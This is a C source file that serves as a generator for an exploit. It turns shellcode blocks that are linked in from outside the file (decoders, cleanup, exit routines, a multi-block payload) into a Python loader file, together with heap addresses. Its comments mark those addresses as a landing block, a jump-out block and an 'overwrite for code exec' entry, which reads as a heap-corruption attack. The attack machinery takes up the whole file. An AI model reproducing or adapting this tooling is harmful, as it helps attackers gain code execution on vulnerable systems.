#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#define MAX_BUF 1024


extern void (*vers_start);
extern void (*vers_end);
#define VERS_LEN ((int)&vers_end - (int)&vers_start)
extern void (*block1_decoder_start);
extern void (*block1_decoder_end);
#define BLOCK1_DECODER_LEN ((int)&block1_decoder_end - (int)&block1_decoder_start)
extern void (*cleanup_start);
extern void (*cleanup_end);
#define CLEANUP_LEN ((int)&cleanup_end - (int)&cleanup_start)
extern void (*block_decoder_start);
extern void (*block_decoder_end);
#define BLOCK_DECODER_LEN ((int)&block_decoder_end - (int)&block_decoder_start)
extern void (*blocks_table_start);
extern void (*blocks_table_end);
#define BLOCKS_TABLE_LEN ((int)&blocks_table_end - (int)&blocks_table_start)
extern void (*epba_exit_start);
extern void (*epba_exit_end);
#define EPBA_EXIT_LEN ((int)&epba_exit_end - (int)&epba_exit_start)
extern int valid_prev;
extern int block0addr;
extern int block1addr;
extern int block2addr;
extern int block3addr;
extern int block4addr;
extern int block5addr;
extern int block6addr;
extern int block7addr;
extern int block8addr;
extern int block9addr;
extern int block10addr;
extern int block11addr;
extern int block12addr;
extern int block13addr;
extern int block14addr;
extern void (*block2_start);
extern void (*block2_end);
#define BLOCK2_LEN ((int)&block2_end - (int)&block2_start)
extern void (*block3_start);
extern void (*block3_end);
#define BLOCK3_LEN ((int)&block3_end - (int)&block3_start)
extern void (*block4_start);
extern void (*block4_end);
#define BLOCK4_LEN ((int)&block4_end - (int)&block4_start)
extern void (*block5_start);
extern void (*block5_end);
#define BLOCK5_LEN ((int)&block5_end - (int)&block5_start)
extern void (*block6_start);
extern void (*block6_end);
#define BLOCK6_LEN ((int)&block6_end - (int)&block6_start)
extern void (*block7_start);
extern void (*block7_end);
#define BLOCK7_LEN ((int)&block7_end - (int)&block7_start)
extern void (*block8_start);
extern void (*block8_end);
#define BLOCK8_LEN ((int)&block8_end - (int)&block8_start)
extern void (*block9_start);
extern void (*block9_end);
#define BLOCK9_LEN ((int)&block9_end - (int)&block9_start)
extern void (*block10_start);
extern void (*block10_end);
#define BLOCK10_LEN ((int)&block10_end - (int)&block10_start)
extern void (*block11_start);
extern void (*block11_end);
#define BLOCK11_LEN ((int)&block11_end - (int)&block11_start)
extern void (*block12_start);
extern void (*block12_end);
#define BLOCK12_LEN ((int)&block12_end - (int)&block12_start)
extern void (*block13_start);
extern void (*block13_end);
#define BLOCK13_LEN ((int)&block13_end - (int)&block13_start)
extern void (*block14_start);
extern void (*block14_end);
#define BLOCK14_LEN ((int)&block14_end - (int)&block14_start)


int write_shellcode(FILE *fp,
		    char *string,
		    int string_len,
		    char *label)
{
  unsigned char buf[MAX_BUF];
  int len;
  int i;

  memcpy(buf, (char *)string, string_len);
  len = string_len;

  fprintf(fp, "%s = \"", label);
  for (i=0; i < len; i++) {
    fprintf(fp, "\\x%02x", buf[i]);
  }
  fprintf(fp, "\"\n\n");
}


int write_array_elmt(FILE *fp,
		     char *string,
		     int string_len,
		     char *label)
{
  unsigned char buf[MAX_BUF];
  int len;
  int i;

  memcpy(buf, (char *)string, string_len);
  len = string_len;

  fprintf(fp, "block.append(\"");
  for (i=0; i < len; i++) {
    fprintf(fp, "\\x%02x", buf[i]);
  }
  fprintf(fp, "\")\n");
}


int main()
{
  FILE *fp;
  unsigned char buf[MAX_BUF];

  sprintf(buf, "%s_loader.py", &vers_start);
  printf("  creating file %s\n", buf);

  if ((fp = fopen(buf, "w")) == NULL) {
    printf("cannot create file %s\n", buf);
    exit(1);
  }

  fprintf(fp, "from util import *\n\n");

  fprintf(fp, "#\n# this file autogenerated, do not touch\n#\n\n");

  fprintf(fp, "vers = \"%s\"\n\n", &vers_start);

  write_shellcode(fp, (char *)&block1_decoder_start, BLOCK1_DECODER_LEN, "block1_decoder");
  write_shellcode(fp, (char *)&block_decoder_start, BLOCK_DECODER_LEN, "block_decoder");
  write_shellcode(fp, (char *)&blocks_table_start, BLOCKS_TABLE_LEN, "blocks_table");
  write_shellcode(fp, (char *)&epba_exit_start, EPBA_EXIT_LEN, "epba_exit");
  write_shellcode(fp, (char *)&cleanup_start, CLEANUP_LEN, "cleanup");

  fprintf(fp, "block = []\n");
  fprintf(fp, "block.append(\"\")  # block[0]\n");
  fprintf(fp, "block.append(\"\")  # block[1]\n");
  write_array_elmt(fp, (char *)&block2_start, BLOCK2_LEN, "block[2]");
  write_array_elmt(fp, (char *)&block3_start, BLOCK3_LEN, "block[3]");
  write_array_elmt(fp, (char *)&block4_start, BLOCK4_LEN, "block[4]");
  write_array_elmt(fp, (char *)&block5_start, BLOCK5_LEN, "block[5]");
  write_array_elmt(fp, (char *)&block6_start, BLOCK6_LEN, "block[6]");
  write_array_elmt(fp, (char *)&block7_start, BLOCK7_LEN, "block[7]");
  write_array_elmt(fp, (char *)&block8_start, BLOCK8_LEN, "block[8]");
  write_array_elmt(fp, (char *)&block9_start, BLOCK9_LEN, "block[9]");
  write_array_elmt(fp, (char *)&block10_start, BLOCK10_LEN, "block[10]");
  write_array_elmt(fp, (char *)&block11_start, BLOCK11_LEN, "block[11]");
  write_array_elmt(fp, (char *)&block12_start, BLOCK12_LEN, "block[12]");
  write_array_elmt(fp, (char *)&block13_start, BLOCK13_LEN, "block[13]");
  write_array_elmt(fp, (char *)&block14_start, BLOCK14_LEN, "block[14]");
  fprintf(fp, "\n");

  fprintf(fp, "neg_index = wordify(\"ffffffec\") # -20\n\n");
  fprintf(fp, "valid_prev = wordify(\"%08x\")\n\n", (int)&valid_prev);

  fprintf(fp, "free_addrs = [\n");
  fprintf(fp, "    wordify(\"%08x\"),  # 0, the blob\n", (int)&block0addr);
  fprintf(fp, "    wordify(\"%08x\"),  # 1, initial landing, cleanup\n", (int)&block1addr);
  fprintf(fp, "    wordify(\"%08x\"),  # 2, first real payload\n", (int)&block2addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block3addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block4addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block5addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block6addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block7addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block8addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block9addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block10addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block11addr);
  fprintf(fp, "    wordify(\"%08x\"),\n", (int)&block12addr);
  fprintf(fp, "    wordify(\"%08x\"),  # last block of payload, jump out\n", (int)&block13addr);
  fprintf(fp, "    wordify(\"%08x\"),  # overwrite for code exec\n", (int)&block14addr);
  fprintf(fp, "]\n\n");

  fclose(fp);
}
